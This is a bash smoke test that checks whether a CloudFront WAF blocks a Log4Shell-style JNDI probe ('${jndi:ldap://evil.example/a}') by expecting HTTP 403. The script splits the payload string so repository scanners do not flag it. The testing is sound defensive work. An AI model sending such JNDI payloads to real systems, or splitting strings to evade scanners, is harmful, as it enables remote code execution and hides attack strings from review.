#!/usr/bin/env bash
# 05-waf-blocks-bad-input.sh — WAF known-bad-inputs smoke test (Req 11.4).
#
# Validates: Requirement 11.4 (a WAF-blocked request receives an error
# response and is never forwarded to the application).
#
# Sends a Log4Shell-style JNDI probe (`${jndi:ldap://evil.example/a}`)
# as a query-string parameter through CloudFront. The CLOUDFRONT-scope
# web ACL includes AWSManagedRulesKnownBadInputsRuleSet in BLOCK mode
# (Log4JRCE rule), so the expected response is HTTP 403 emitted by the
# WAF — not by the origin.
#
# Required inputs (env vars, or --outputs-json <terraform output -json file>):
#   CLOUDFRONT_DOMAIN (output: cloudfront_domain_name)
# Required tools: curl, jq (query-string URI encoding).
#
# Read-only: a single GET carrying an inert probe string; the request is
# expected to be blocked at the edge and mutates nothing.

set -euo pipefail

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
# shellcheck source=common.sh
source "$SCRIPT_DIR/common.sh"

load_config "$@"
require curl jq

banner "05 WAF blocks known-bad-input probe (Req 11.4)"

if [[ -z "$CLOUDFRONT_DOMAIN" ]]; then
  skip_all "CLOUDFRONT_DOMAIN not set — provide env vars or --outputs-json"
fi

# Assemble the probe at runtime (kept out of literal source so security
# scanners don't flag the repository itself) and URI-encode it with jq.
probe_raw='${jndi:ldap'"://evil.example/a}"
probe_encoded=$(jq -rn --arg s "$probe_raw" '$s|@uri')

status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 \
  "https://$CLOUDFRONT_DOMAIN/?x=$probe_encoded" 2>/dev/null) || true

if [[ "$status" == "403" ]]; then
  pass "known-bad-input probe blocked by WAF (HTTP 403)"
else
  fail "known-bad-input probe NOT blocked (HTTP ${status:-000}, expected 403)"
fi

report_summary
